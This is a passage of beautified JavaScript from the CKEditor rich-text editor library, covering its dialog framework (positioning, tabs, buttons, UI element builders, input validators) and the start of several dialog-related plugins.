                        e = CKEDITOR.dom.element.createFromHtml('<div class="cke_resizer' + e + " cke_resizer_" + p.lang.dir + '" title="' + CKEDITOR.tools.htmlEncode(p.lang.common.resize) + '" onmousedown="CKEDITOR.tools.callFunction(' + t + ', event )">' + ("ltr" == p.lang.dir ? "◢" : "◣") + "</div>"),
                        l.parts.footer.append(e, 1);
                    }), p.on("destroy", function() {
                        CKEDITOR.tools.removeFunction(t);
                    });
                }
            }(this), new CKEDITOR.dom.text(n.title, CKEDITOR.document).appendTo(this.parts.title),
            d = 0; d < n.contents.length; d++) (u = n.contents[d]) && this.addPage(u);
            for (this.parts.tabs.on("click", function(e) {
                var t = e.data.getTarget();
                t.hasClass("cke_dialog_tab") && (t = t.$.id, this.selectPage(t.substring(4, t.lastIndexOf("_"))),
                this._.tabBarMode && (this._.tabBarMode = !1, this._.currentFocusIndex = -1, o(1)),
                e.data.preventDefault());
            }, this), d = [], u = CKEDITOR.dialog._.uiElementBuilders.hbox.build(this, {
                type: "hbox",
                className: "cke_dialog_footer_buttons",
                widths: [],
                children: n.buttons
            }, d).getChild(), this.parts.footer.setHtml(d.join("")), d = 0; d < u.length; d++) this._.buttons[u[d].id] = u[d];
        }, CKEDITOR.dialog.prototype = {
            destroy: function() {
                this.hide(), this._.element.remove();
            },
            resize: function(e, t) {
                this._.contentSize && this._.contentSize.width == e && this._.contentSize.height == t || (CKEDITOR.dialog.fire("resize", {
                    dialog: this,
                    width: e,
                    height: t
                }, this._.editor), this.fire("resize", {
                    width: e,
                    height: t
                }, this._.editor), this.parts.contents.setStyles({
                    width: e + "px",
                    height: t + "px"
                }), "rtl" == this._.editor.lang.dir && this._.position && (this._.position.x = CKEDITOR.document.getWindow().getViewPaneSize().width - this._.contentSize.width - parseInt(this._.element.getFirst().getStyle("right"), 10)),
                this._.contentSize = {
                    width: e,
                    height: t
                });
            },
            getSize: function() {
                var e = this._.element.getFirst();
                return {
                    width: e.$.offsetWidth || 0,
                    height: e.$.offsetHeight || 0
                };
            },
            move: function(e, t, n) {
                var i = this._.element.getFirst(), o = "rtl" == this._.editor.lang.dir, a = "fixed" == i.getComputedStyle("position");
                CKEDITOR.env.ie && i.setStyle("zoom", "100%"), a && this._.position && this._.position.x == e && this._.position.y == t || (this._.position = {
                    x: e,
                    y: t
                }, a || (e += (a = CKEDITOR.document.getWindow().getScrollPosition()).x, t += a.y),
                o && (a = this.getSize(), e = CKEDITOR.document.getWindow().getViewPaneSize().width - a.width - e),
                (t = {
                    top: (0 < t ? t : 0) + "px"
                })[o ? "right" : "left"] = (0 < e ? e : 0) + "px", i.setStyles(t), n && (this._.moved = 1));
            },
            getPosition: function() {
                return CKEDITOR.tools.extend({}, this._.position);
            },
            show: function() {
                var e = this._.element, t = this.definition;
                for (var n in e.getParent() && e.getParent().equals(CKEDITOR.document.getBody()) ? e.setStyle("display", "block") : e.appendTo(CKEDITOR.document.getBody()),
                this.resize(this._.contentSize && this._.contentSize.width || t.width || t.minWidth, this._.contentSize && this._.contentSize.height || t.height || t.minHeight),
                this.reset(), this.selectPage(this.definition.contents[0].id), null === CKEDITOR.dialog._.currentZIndex && (CKEDITOR.dialog._.currentZIndex = this._.editor.config.baseFloatZIndex),
                this._.element.getFirst().setStyle("z-index", CKEDITOR.dialog._.currentZIndex += 10),
                null === CKEDITOR.dialog._.currentTop ? ((CKEDITOR.dialog._.currentTop = this)._.parentDialog = null,
                l(this._.editor)) : (this._.parentDialog = CKEDITOR.dialog._.currentTop, this._.parentDialog.getElement().getFirst().$.style.zIndex -= Math.floor(this._.editor.config.baseFloatZIndex / 2),
                CKEDITOR.dialog._.currentTop = this), e.on("keydown", K), e.on("keyup", y), this._.hasFocus = !1,
                t.contents) if (t.contents[n]) {
                    e = t.contents[n];
                    var i = this._.tabs[e.id], o = e.requiredContent, a = 0;
                    if (i) {
                        for (var r in this._.contents[e.id]) {
                            var s = this._.contents[e.id][r];
                            "hbox" == s.type || "vbox" == s.type || !s.getInputElement() || (s.requiredContent && !this._.editor.activeFilter.check(s.requiredContent) ? s.disable() : (s.enable(),
                            a++));
                        }
                        !a || o && !this._.editor.activeFilter.check(o) ? i[0].addClass("cke_dialog_tab_disabled") : i[0].removeClass("cke_dialog_tab_disabled");
                    }
                }
                CKEDITOR.tools.setTimeout(function() {
                    this.layout(), function(e) {
                        function t() {
                            e.layout();
                        }
                        var n = CKEDITOR.document.getWindow();
                        n.on("resize", t), e.on("hide", function() {
                            n.removeListener("resize", t);
                        });
                    }(this), this.parts.dialog.setStyle("visibility", ""), this.fireOnce("load", {}),
                    CKEDITOR.ui.fire("ready", this), this.fire("show", {}), this._.editor.fire("dialogShow", this),
                    this._.parentDialog || this._.editor.focusManager.lock(), this.foreach(function(e) {
                        e.setInitValue && e.setInitValue();
                    });
                }, 100, this);
            },
            layout: function() {
                var e = this.parts.dialog, t = this.getSize(), n = CKEDITOR.document.getWindow().getViewPaneSize(), i = (n.width - t.width) / 2, o = (n.height - t.height) / 2;
                CKEDITOR.env.ie6Compat || (t.height + (0 < o ? o : 0) > n.height || t.width + (0 < i ? i : 0) > n.width ? e.setStyle("position", "absolute") : e.setStyle("position", "fixed")),
                this.move(this._.moved ? this._.position.x : i, this._.moved ? this._.position.y : o);
            },
            foreach: function(e) {
                for (var t in this._.contents) for (var n in this._.contents[t]) e.call(this, this._.contents[t][n]);
                return this;
            },
            reset: (e = function(e) {
                e.reset && e.reset(1);
            }, function() {
                return this.foreach(e), this;
            }),
            setupContent: function() {
                var t = arguments;
                this.foreach(function(e) {
                    e.setup && e.setup.apply(e, t);
                });
            },
            commitContent: function() {
                var t = arguments;
                this.foreach(function(e) {
                    CKEDITOR.env.ie && this._.currentFocusIndex == e.focusIndex && e.getInputElement().$.blur(),
                    e.commit && e.commit.apply(e, t);
                });
            },
            hide: function() {
                if (this.parts.dialog.isVisible()) {
                    this.fire("hide", {}), this._.editor.fire("dialogHide", this), this.selectPage(this._.tabIdList[0]);
                    var e = this._.element;
                    for (e.setStyle("display", "none"), this.parts.dialog.setStyle("visibility", "hidden"),
                    k(this); CKEDITOR.dialog._.currentTop != this; ) CKEDITOR.dialog._.currentTop.hide();
                    if (this._.parentDialog) {
                        var t = this._.parentDialog.getElement().getFirst();
                        t.setStyle("z-index", parseInt(t.$.style.zIndex, 10) + Math.floor(this._.editor.config.baseFloatZIndex / 2));
                    } else o(this._.editor);
                    if (CKEDITOR.dialog._.currentTop = this._.parentDialog) CKEDITOR.dialog._.currentZIndex -= 10; else {
                        CKEDITOR.dialog._.currentZIndex = null, e.removeListener("keydown", K), e.removeListener("keyup", y);
                        var n = this._.editor;
                        n.focus(), setTimeout(function() {
                            n.focusManager.unlock(), CKEDITOR.env.iOS && n.window.focus();
                        }, 0);
                    }
                    delete this._.parentDialog, this.foreach(function(e) {
                        e.resetInitValue && e.resetInitValue();
                    });
                }
            },
            addPage: function(e) {
                if (!e.requiredContent || this._.editor.filter.check(e.requiredContent)) {
                    for (var t = [], n = e.label ? ' title="' + CKEDITOR.tools.htmlEncode(e.label) + '"' : "", i = CKEDITOR.dialog._.uiElementBuilders.vbox.build(this, {
                        type: "vbox",
                        className: "cke_dialog_page_contents",
                        children: e.elements,
                        expand: !!e.expand,
                        padding: e.padding,
                        style: e.style || "width: 100%;"
                    }, t), o = this._.contents[e.id] = {}, a = i.getChild(), r = 0; i = a.shift(); ) !i.notAllowed && "hbox" != i.type && "vbox" != i.type && r++,
                    "function" == typeof (o[i.id] = i).getChild && a.push.apply(a, i.getChild());
                    r || (e.hidden = !0), (t = CKEDITOR.dom.element.createFromHtml(t.join(""))).setAttribute("role", "tabpanel"),
                    i = CKEDITOR.env, o = "cke_" + e.id + "_" + CKEDITOR.tools.getNextNumber(), n = CKEDITOR.dom.element.createFromHtml([ '<a class="cke_dialog_tab"', 0 < this._.pageCount ? " cke_last" : "cke_first", n, e.hidden ? ' style="display:none"' : "", ' id="', o, '"', i.gecko && !i.hc ? "" : ' href="javascript:void(0)"', ' tabIndex="-1" hidefocus="true" role="tab">', e.label, "</a>" ].join("")),
                    t.setAttribute("aria-labelledby", o), this._.tabs[e.id] = [ n, t ], this._.tabIdList.push(e.id),
                    !e.hidden && this._.pageCount++, this._.lastTab = n, this.updateStyle(), t.setAttribute("name", e.id),
                    t.appendTo(this.parts.contents), n.unselectable(), this.parts.tabs.append(n), e.accessKey && (_(this, this, "CTRL+" + e.accessKey, S, N),
                    this._.accessKeyMap["CTRL+" + e.accessKey] = e.id);
                }
            },
            selectPage: function(e) {
                if (this._.currentTabId != e && !this._.tabs[e][0].hasClass("cke_dialog_tab_disabled") && !1 !== this.fire("selectPage", {
                    page: e,
                    currentPage: this._.currentTabId
                })) {
                    for (var t in this._.tabs) {
                        var n = this._.tabs[t][0], i = this._.tabs[t][1];
                        t != e && (n.removeClass("cke_dialog_tab_selected"), i.hide()), i.setAttribute("aria-hidden", t != e);
                    }
                    var o = this._.tabs[e];
                    o[0].addClass("cke_dialog_tab_selected"), CKEDITOR.env.ie6Compat || CKEDITOR.env.ie7Compat ? (a(o[1]),
                    o[1].show(), setTimeout(function() {
                        a(o[1], 1);
                    }, 0)) : o[1].show(), this._.currentTabId = e, this._.currentTabIndex = CKEDITOR.tools.indexOf(this._.tabIdList, e);
                }
            },
            updateStyle: function() {
                this.parts.dialog[(1 === this._.pageCount ? "add" : "remove") + "Class"]("cke_single_page");
            },
            hidePage: function(e) {
                var t = this._.tabs[e] && this._.tabs[e][0];
                t && 1 != this._.pageCount && t.isVisible() && (e == this._.currentTabId && this.selectPage(E.call(this)),
                t.hide(), this._.pageCount--, this.updateStyle());
            },
            showPage: function(e) {
                (e = this._.tabs[e] && this._.tabs[e][0]) && (e.show(), this._.pageCount++, this.updateStyle());
            },
            getElement: function() {
                return this._.element;
            },
            getName: function() {
                return this._.name;
            },
            getContentElement: function(e, t) {
                var n = this._.contents[e];
                return n && n[t];
            },
            getValueOf: function(e, t) {
                return this.getContentElement(e, t).getValue();
            },
            setValueOf: function(e, t, n) {
                return this.getContentElement(e, t).setValue(n);
            },
            getButton: function(e) {
                return this._.buttons[e];
            },
            click: function(e) {
                return this._.buttons[e].click();
            },
            disableButton: function(e) {
                return this._.buttons[e].disable();
            },
            enableButton: function(e) {
                return this._.buttons[e].enable();
            },
            getPageCount: function() {
                return this._.pageCount;
            },
            getParentEditor: function() {
                return this._.editor;
            },
            getSelectedElement: function() {
                return this.getParentEditor().getSelection().getSelectedElement();
            },
            addFocusable: function(e, t) {
                if (void 0 === t) t = this._.focusList.length, this._.focusList.push(new i(this, e, t)); else {
                    this._.focusList.splice(t, 0, new i(this, e, t));
                    for (var n = t + 1; n < this._.focusList.length; n++) this._.focusList[n].focusIndex++;
                }
            }
        }, CKEDITOR.tools.extend(CKEDITOR.dialog, {
            add: function(e, t) {
                this._.dialogDefinitions[e] && "function" != typeof t || (this._.dialogDefinitions[e] = t);
            },
            exists: function(e) {
                return !!this._.dialogDefinitions[e];
            },
            getCurrent: function() {
                return CKEDITOR.dialog._.currentTop;
            },
            isTabEnabled: function(e, t, n) {
                return !((e = e.config.removeDialogTabs) && e.match(RegExp("(?:^|;)" + t + ":" + n + "(?:$|;)", "i")));
            },
            okButton: (s = function(e, t) {
                return t = t || {}, CKEDITOR.tools.extend({
                    id: "ok",
                    type: "button",
                    label: e.lang.common.ok,
                    class: "cke_dialog_ui_button_ok",
                    onClick: function(e) {
                        !1 !== (e = e.data.dialog).fire("ok", {
                            hide: !0
                        }).hide && e.hide();
                    }
                }, t, !0);
            }, s.type = "button", s.override = function(t) {
                return CKEDITOR.tools.extend(function(e) {
                    return s(e, t);
                }, {
                    type: "button"
                }, !0);
            }, s),
            cancelButton: (n = function(e, t) {
                return t = t || {}, CKEDITOR.tools.extend({
                    id: "cancel",
                    type: "button",
                    label: e.lang.common.cancel,
                    class: "cke_dialog_ui_button_cancel",
                    onClick: function(e) {
                        !1 !== (e = e.data.dialog).fire("cancel", {
                            hide: !0
                        }).hide && e.hide();
                    }
                }, t, !0);
            }, n.type = "button", n.override = function(t) {
                return CKEDITOR.tools.extend(function(e) {
                    return n(e, t);
                }, {
                    type: "button"
                }, !0);
            }, n),
            addUIElement: function(e, t) {
                this._.uiElementBuilders[e] = t;
            }
        }), CKEDITOR.dialog._ = {
            uiElementBuilders: {},
            dialogDefinitions: {},
            currentTop: null,
            currentZIndex: null
        }, CKEDITOR.event.implementOn(CKEDITOR.dialog), CKEDITOR.event.implementOn(CKEDITOR.dialog.prototype);
        var C = {
            resizable: CKEDITOR.DIALOG_RESIZE_BOTH,
            minWidth: 600,
            minHeight: 400,
            buttons: [ CKEDITOR.dialog.okButton, CKEDITOR.dialog.cancelButton ]
        }, u = function(e, t, n) {
            for (var i, o = 0; i = e[o]; o++) if (i.id == t || n && i[n] && (i = u(i[n], t, n))) return i;
            return null;
        }, h = function(e, t, n, i, o) {
            if (n) {
                for (var a, r = 0; a = e[r]; r++) {
                    if (a.id == n) return e.splice(r, 0, t), t;
                    if (i && a[i] && (a = h(a[i], t, n, i, !0))) return a;
                }
                if (o) return null;
            }
            return e.push(t), t;
        }, f = function(e, t, n) {
            for (var i, o = 0; i = e[o]; o++) {
                if (i.id == t) return e.splice(o, 1);
                if (n && i[n] && (i = f(i[n], t, n))) return i;
            }
            return null;
        }, I = function(e, t) {
            this.dialog = e;
            for (var n, i = t.contents, o = 0; n = i[o]; o++) i[o] = n && new r(e, n);
            CKEDITOR.tools.extend(this, t);
        };
        I.prototype = {
            getContents: function(e) {
                return u(this.contents, e);
            },
            getButton: function(e) {
                return u(this.buttons, e);
            },
            addContents: function(e, t) {
                return h(this.contents, e, t);
            },
            addButton: function(e, t) {
                return h(this.buttons, e, t);
            },
            removeContents: function(e) {
                f(this.contents, e);
            },
            removeButton: function(e) {
                f(this.buttons, e);
            }
        }, r.prototype = {
            get: function(e) {
                return u(this.elements, e, "children");
            },
            add: function(e, t) {
                return h(this.elements, e, t, "children");
            },
            remove: function(e) {
                f(this.elements, e, "children");
            }
        };
        var m, O, t, g, D, R, v = {}, b = {}, K = function(e) {
            var t = e.data.$.ctrlKey || e.data.$.metaKey, n = e.data.$.altKey, i = e.data.$.shiftKey, o = String.fromCharCode(e.data.$.keyCode);
            (t = b[(t ? "CTRL+" : "") + (n ? "ALT+" : "") + (i ? "SHIFT+" : "") + o]) && t.length && ((t = t[t.length - 1]).keydown && t.keydown.call(t.uiElement, t.dialog, t.key),
            e.data.preventDefault());
        }, y = function(e) {
            var t = e.data.$.ctrlKey || e.data.$.metaKey, n = e.data.$.altKey, i = e.data.$.shiftKey, o = String.fromCharCode(e.data.$.keyCode);
            (t = b[(t ? "CTRL+" : "") + (n ? "ALT+" : "") + (i ? "SHIFT+" : "") + o]) && t.length && (t = t[t.length - 1]).keyup && (t.keyup.call(t.uiElement, t.dialog, t.key),
            e.data.preventDefault());
        }, _ = function(e, t, n, i, o) {
            (b[n] || (b[n] = [])).push({
                uiElement: e,
                dialog: t,
                key: n,
                keyup: o || e.accessKeyUp,
                keydown: i || e.accessKeyDown
            });
        }, k = function(e) {
            for (var t in b) {
                for (var n = b[t], i = n.length - 1; 0 <= i; i--) (n[i].dialog == e || n[i].uiElement == e) && n.splice(i, 1);
                0 === n.length && delete b[t];
            }
        }, N = function(e, t) {
            e._.accessKeyMap[t] && e.selectPage(e._.accessKeyMap[t]);
        }, S = function() {};
        CKEDITOR.ui.dialog = {
            uiElement: function(n, i, e, t, o, a, r) {
                if (!(arguments.length < 4)) {
                    var s = (t.call ? t(i) : t) || "div", l = [ "<", s, " " ], c = (o && o.call ? o(i) : o) || {}, d = (a && a.call ? a(i) : a) || {}, u = (r && r.call ? r.call(this, n, i) : r) || "", h = this.domId = d.id || CKEDITOR.tools.getNextId() + "_uiElement";
                    i.requiredContent && !n.getParentEditor().filter.check(i.requiredContent) && (c.display = "none",
                    this.notAllowed = !0), d.id = h;
                    var f = {};
                    i.type && (f["cke_dialog_ui_" + i.type] = 1), i.className && (f[i.className] = 1),
                    i.disabled && (f.cke_disabled = 1);
                    var m = d.class && d.class.split ? d.class.split(" ") : [];
                    for (h = 0; h < m.length; h++) m[h] && (f[m[h]] = 1);
                    for (h in m = [], f) m.push(h);
                    for (h in d.class = m.join(" "), i.title && (d.title = i.title), f = (i.style || "").split(";"),
                    i.align && (m = i.align, c["margin-left"] = "left" == m ? 0 : "auto", c["margin-right"] = "right" == m ? 0 : "auto"),
                    c) f.push(h + ":" + c[h]);
                    for (i.hidden && f.push("display:none"), h = f.length - 1; 0 <= h; h--) "" === f[h] && f.splice(h, 1);
                    for (h in 0 < f.length && (d.style = (d.style ? d.style + "; " : "") + f.join("; ")),
                    d) l.push(h + '="' + CKEDITOR.tools.htmlEncode(d[h]) + '" ');
                    l.push(">", u, "</", s, ">"), e.push(l.join("")), (this._ || (this._ = {})).dialog = n,
                    "boolean" == typeof i.isChanged && (this.isChanged = function() {
                        return i.isChanged;
                    }), "function" == typeof i.isChanged && (this.isChanged = i.isChanged), "function" == typeof i.setValue && (this.setValue = CKEDITOR.tools.override(this.setValue, function(t) {
                        return function(e) {
                            t.call(this, i.setValue.call(this, e));
                        };
                    })), "function" == typeof i.getValue && (this.getValue = CKEDITOR.tools.override(this.getValue, function(e) {
                        return function() {
                            return i.getValue.call(this, e.call(this));
                        };
                    })), CKEDITOR.event.implementOn(this), this.registerEvents(i), this.accessKeyUp && this.accessKeyDown && i.accessKey && _(this, n, "CTRL+" + i.accessKey);
                    var g = this;
                    n.on("load", function() {
                        var e = g.getInputElement();
                        if (e) {
                            var t = g.type in {
                                checkbox: 1,
                                ratio: 1
                            } && CKEDITOR.env.ie && CKEDITOR.env.version < 8 ? "cke_dialog_ui_focused" : "";
                            e.on("focus", function() {
                                n._.tabBarMode = !1, n._.hasFocus = !0, g.fire("focus"), t && this.addClass(t);
                            }), e.on("blur", function() {
                                g.fire("blur"), t && this.removeClass(t);
                            });
                        }
                    }), CKEDITOR.tools.extend(this, i), this.keyboardFocusable && (this.tabIndex = i.tabIndex || 0,
                    this.focusIndex = n._.focusList.push(this) - 1, this.on("focus", function() {
                        n._.currentFocusIndex = g.focusIndex;
                    }));
                }
            },
            hbox: function(e, t, i, n, o) {
                if (!(arguments.length < 4)) {
                    this._ || (this._ = {});
                    var a, r = this._.children = t, s = o && o.widths || null, l = o && o.height || null, c = {
                        role: "presentation"
                    };
                    o && o.align && (c.align = o.align), CKEDITOR.ui.dialog.uiElement.call(this, e, o || {
                        type: "hbox"
                    }, n, "table", {}, c, function() {
                        var e = [ '<tbody><tr class="cke_dialog_ui_hbox">' ];
                        for (a = 0; a < i.length; a++) {
                            var t = "cke_dialog_ui_hbox_child", n = [];
                            0 === a && (t = "cke_dialog_ui_hbox_first"), a == i.length - 1 && (t = "cke_dialog_ui_hbox_last"),
                            e.push('<td class="', t, '" role="presentation" '), s ? s[a] && n.push("width:" + d(s[a])) : n.push("width:" + Math.floor(100 / i.length) + "%"),
                            l && n.push("height:" + d(l)), o && void 0 !== o.padding && n.push("padding:" + d(o.padding)),
                            CKEDITOR.env.ie && CKEDITOR.env.quirks && r[a].align && n.push("text-align:" + r[a].align),
                            0 < n.length && e.push('style="' + n.join("; ") + '" '), e.push(">", i[a], "</td>");
                        }
                        return e.push("</tr></tbody>"), e.join("");
                    });
                }
            },
            vbox: function(i, e, o, t, a) {
                if (!(arguments.length < 3)) {
                    this._ || (this._ = {});
                    var r = this._.children = e, s = a && a.width || null, l = a && a.heights || null;
                    CKEDITOR.ui.dialog.uiElement.call(this, i, a || {
                        type: "vbox"
                    }, t, "div", null, {
                        role: "presentation"
                    }, function() {
                        var e = [ '<table role="presentation" cellspacing="0" border="0" ' ];
                        e.push('style="'), a && a.expand && e.push("height:100%;"), e.push("width:" + d(s || "100%"), ";"),
                        CKEDITOR.env.webkit && e.push("float:none;"), e.push('"'), e.push('align="', CKEDITOR.tools.htmlEncode(a && a.align || ("ltr" == i.getParentEditor().lang.dir ? "left" : "right")), '" '),
                        e.push("><tbody>");
                        for (var t = 0; t < o.length; t++) {
                            var n = [];
                            e.push('<tr><td role="presentation" '), s && n.push("width:" + d(s || "100%")),
                            l ? n.push("height:" + d(l[t])) : a && a.expand && n.push("height:" + Math.floor(100 / o.length) + "%"),
                            a && void 0 !== a.padding && n.push("padding:" + d(a.padding)), CKEDITOR.env.ie && CKEDITOR.env.quirks && r[t].align && n.push("text-align:" + r[t].align),
                            0 < n.length && e.push('style="', n.join("; "), '" '), e.push(' class="cke_dialog_ui_vbox_child">', o[t], "</td></tr>");
                        }
                        return e.push("</tbody></table>"), e.join("");
                    });
                }
            }
        }, CKEDITOR.ui.dialog.uiElement.prototype = {
            getElement: function() {
                return CKEDITOR.document.getById(this.domId);
            },
            getInputElement: function() {
                return this.getElement();
            },
            getDialog: function() {
                return this._.dialog;
            },
            setValue: function(e, t) {
                return this.getInputElement().setValue(e), !t && this.fire("change", {
                    value: e
                }), this;
            },
            getValue: function() {
                return this.getInputElement().getValue();
            },
            isChanged: function() {
                return !1;
            },
            selectParentTab: function() {
                for (var e = this.getInputElement(); (e = e.getParent()) && -1 == e.$.className.search("cke_dialog_page_contents"); ) ;
                return e && (e = e.getAttribute("name"), this._.dialog._.currentTabId != e && this._.dialog.selectPage(e)),
                this;
            },
            focus: function() {
                return this.selectParentTab().getInputElement().focus(), this;
            },
            registerEvents: function(e) {
                var t, n;
                for (n in e) (t = n.match(/^on([A-Z]\w+)/)) && (this.eventProcessors[n] ? this.eventProcessors[n].call(this, this._.dialog, e[n]) : function(e, t, n, i) {
                    t.on("load", function() {
                        e.getInputElement().on(n, i, e);
                    });
                }(this, this._.dialog, t[1].toLowerCase(), e[n]));
                return this;
            },
            eventProcessors: {
                onLoad: function(e, t) {
                    e.on("load", t, this);
                },
                onShow: function(e, t) {
                    e.on("show", t, this);
                },
                onHide: function(e, t) {
                    e.on("hide", t, this);
                }
            },
            accessKeyDown: function() {
                this.focus();
            },
            accessKeyUp: function() {},
            disable: function() {
                var e = this.getElement();
                this.getInputElement().setAttribute("disabled", "true"), e.addClass("cke_disabled");
            },
            enable: function() {
                var e = this.getElement();
                this.getInputElement().removeAttribute("disabled"), e.removeClass("cke_disabled");
            },
            isEnabled: function() {
                return !this.getElement().hasClass("cke_disabled");
            },
            isVisible: function() {
                return this.getInputElement().isVisible();
            },
            isFocusable: function() {
                return !(!this.isEnabled() || !this.isVisible());
            }
        }, CKEDITOR.ui.dialog.hbox.prototype = CKEDITOR.tools.extend(new CKEDITOR.ui.dialog.uiElement(), {
            getChild: function(e) {
                return arguments.length < 1 ? this._.children.concat() : (e.splice || (e = [ e ]),
                e.length < 2 ? this._.children[e[0]] : this._.children[e[0]] && this._.children[e[0]].getChild ? this._.children[e[0]].getChild(e.slice(1, e.length)) : null);
            }
        }, !0), CKEDITOR.ui.dialog.vbox.prototype = new CKEDITOR.ui.dialog.hbox(), R = {
            build: function(e, t, n) {
                for (var i, o = t.children, a = [], r = [], s = 0; s < o.length && (i = o[s]); s++) {
                    var l = [];
                    a.push(l), r.push(CKEDITOR.dialog._.uiElementBuilders[i.type].build(e, i, l));
                }
                return new CKEDITOR.ui.dialog[t.type](e, r, a, n, t);
            }
        }, CKEDITOR.dialog.addUIElement("hbox", R), CKEDITOR.dialog.addUIElement("vbox", R),
        CKEDITOR.dialogCommand = function(e, t) {
            this.dialogName = e, CKEDITOR.tools.extend(this, t, !0);
        }, CKEDITOR.dialogCommand.prototype = {
            exec: function(e) {
                e.openDialog(this.dialogName);
            },
            canUndo: !1,
            editorFocus: 1
        }, t = /^(((\d*(\.\d+))|(\d*))(px|\%)?)?$/, g = /^(((\d*(\.\d+))|(\d*))(px|em|ex|in|cm|mm|pt|pc|\%)?)?$/i,
        D = /^(\s*[\w-]+\s*:\s*[^:;]+(?:;|$))*$/, CKEDITOR.VALIDATE_OR = 1, CKEDITOR.VALIDATE_AND = 2,
        CKEDITOR.dialog.validate = {
            functions: function() {
                var r = arguments;
                return function() {
                    var e, t, n = this && this.getValue ? this.getValue() : r[0], i = CKEDITOR.VALIDATE_AND, o = [];
                    for (t = 0; t < r.length && "function" == typeof r[t]; t++) o.push(r[t]);
                    t < r.length && "string" == typeof r[t] && (e = r[t], t++), t < r.length && "number" == typeof r[t] && (i = r[t]);
                    var a = i == CKEDITOR.VALIDATE_AND;
                    for (t = 0; t < o.length; t++) a = i == CKEDITOR.VALIDATE_AND ? a && o[t](n) : a || o[t](n);
                    return !!a || e;
                };
            },
            regex: function(t, n) {
                return function(e) {
                    return e = this && this.getValue ? this.getValue() : e, !!t.test(e) || n;
                };
            },
            notEmpty: function(e) {
                return this.regex(/^([a]|[^a])+$/, e);
            },
            integer: function(e) {
                return this.regex(/^\d*$/, e);
            },
            number: function(e) {
                return this.regex(/^\d*(?:\.\d+)?$/, e);
            },
            cssLength: function(e) {
                return this.functions(function(e) {
                    return g.test(CKEDITOR.tools.trim(e));
                }, e);
            },
            htmlLength: function(e) {
                return this.functions(function(e) {
                    return t.test(CKEDITOR.tools.trim(e));
                }, e);
            },
            inlineStyle: function(e) {
                return this.functions(function(e) {
                    return D.test(CKEDITOR.tools.trim(e));
                }, e);
            },
            equals: function(t, e) {
                return this.functions(function(e) {
                    return e == t;
                }, e);
            },
            notEqual: function(t, e) {
                return this.functions(function(e) {
                    return e != t;
                }, e);
            }
        }, CKEDITOR.on("instanceDestroyed", function(e) {
            if (CKEDITOR.tools.isEmpty(CKEDITOR.instances)) {
                for (var t; t = CKEDITOR.dialog._.currentTop; ) t.hide();
                for (var n in v) v[n].remove();
                v = {};
            }
            var i;
            for (i in e = e.editor._.storedDialogs) e[i].destroy();
        }), CKEDITOR.tools.extend(CKEDITOR.editor.prototype, {
            openDialog: function(e, t) {
                CKEDITOR.editorName = this.name;
                var n = null, i = CKEDITOR.dialog._.dialogDefinitions[e];
                if (null === CKEDITOR.dialog._.currentTop && l(this), "function" == typeof i) n = (n = this._.storedDialogs || (this._.storedDialogs = {}))[e] || (n[e] = new CKEDITOR.dialog(this, e)),
                t && t.call(n, n), n.show(); else {
                    if ("failed" == i) throw o(this), Error('[CKEDITOR.dialog.openDialog] Dialog "' + e + '" failed when loading definition.');
                    "string" == typeof i && CKEDITOR.scriptLoader.load(CKEDITOR.getUrl(i), function() {
                        "function" != typeof CKEDITOR.dialog._.dialogDefinitions[e] && (CKEDITOR.dialog._.dialogDefinitions[e] = "failed"),
                        this.openDialog(e, t);
                    }, this, 0, 1);
                }
                return CKEDITOR.skin.loadPart("dialog"), n;
            }
        });
    }(), CKEDITOR.plugins.add("dialog", {
        requires: "dialogui",
        init: function(t) {
            t.on("doubleclick", function(e) {
                e.data.dialog && t.openDialog(e.data.dialog);
            }, null, null, 999);
        }
    }), CKEDITOR.plugins.add("about", {
        requires: "dialog",
        init: function(e) {
            var t = e.addCommand("about", new CKEDITOR.dialogCommand("about"));
            t.modes = {
                wysiwyg: 1,
                source: 1
            }, t.canUndo = !1, t.readOnly = 1, e.ui.addButton && e.ui.addButton("About", {
                label: e.lang.about.title,
                command: "about",
                toolbar: "about"
            }), CKEDITOR.dialog.add("about", this.path + "dialogs/about.js");
        }
    }), CKEDITOR.plugins.add("a11yhelp", {
        requires: "dialog",
        availableLangs: {
            af: 1,
            ar: 1,
            bg: 1,
            ca: 1,
            cs: 1,
            cy: 1,
            da: 1,
            de: 1,
            el: 1,
            en: 1,
            "en-gb": 1,
            eo: 1,
            es: 1,
            et: 1,
            fa: 1,
            fi: 1,
            fr: 1,
            "fr-ca": 1,
            gl: 1,
            gu: 1,
            he: 1,
            hi: 1,
            hr: 1,
            hu: 1,
            id: 1,
            it: 1,
            ja: 1,
            km: 1,
            ko: 1,
            ku: 1,
            lt: 1,
            lv: 1,
            mk: 1,
            mn: 1,
            nb: 1,
            nl: 1,
            no: 1,
            pl: 1,
            pt: 1,
            "pt-br": 1,
            ro: 1,
            ru: 1,
            si: 1,
            sk: 1,
            sl: 1,
            sq: 1,
            sr: 1,
            "sr-latn": 1,
            sv: 1,
            th: 1,
            tr: 1,
            tt: 1,
            ug: 1,
            uk: 1,
            vi: 1,
            zh: 1,
            "zh-cn": 1
        },
        init: function(t) {
            var n = this;
            t.addCommand("a11yHelp", {
                exec: function() {
                    var e = t.langCode;
                    e = n.availableLangs[e] ? e : n.availableLangs[e.replace(/-.*/, "")] ? e.replace(/-.*/, "") : "en",
                    CKEDITOR.scriptLoader.load(CKEDITOR.getUrl(n.path + "dialogs/lang/" + e + ".js"), function() {
                        t.lang.a11yhelp = n.langEntries[e], t.openDialog("a11yHelp");
                    });
                },
                modes: {
                    wysiwyg: 1,
                    source: 1
                },
                readOnly: 1,
                canUndo: !1
            }), t.setKeystroke(CKEDITOR.ALT + 48, "a11yHelp"), CKEDITOR.dialog.add("a11yHelp", this.path + "dialogs/a11yhelp.js"),
            t.on("ariaEditorHelpLabel", function(e) {
                e.data.label = t.lang.common.editorHelp;
            });
        }
    }), function() {
        function r(e) {
            var t = this.att;
            void 0 !== (e = e && e.hasAttribute(t) && e.getAttribute(t) || "") && this.setValue(e);
        }
        function s() {
            for (var e, t = 0; t < arguments.length; t++) if (arguments[t] instanceof CKEDITOR.dom.element) {
                e = arguments[t];
                break;
            }
            if (e) {
                t = this.att;
                var n = this.getValue();
                n ? e.setAttribute(t, n) : e.removeAttribute(t, n);
            }
        }
        var l = {
            id: 1,
            dir: 1,
            classes: 1,
            styles: 1
        };
        CKEDITOR.plugins.add("dialogadvtab", {
            requires: "dialog",
            allowedContent: function(e) {
                e || (e = l);
                var t = [];
                e.id && t.push("id"), e.dir && t.push("dir");
                var n = "";
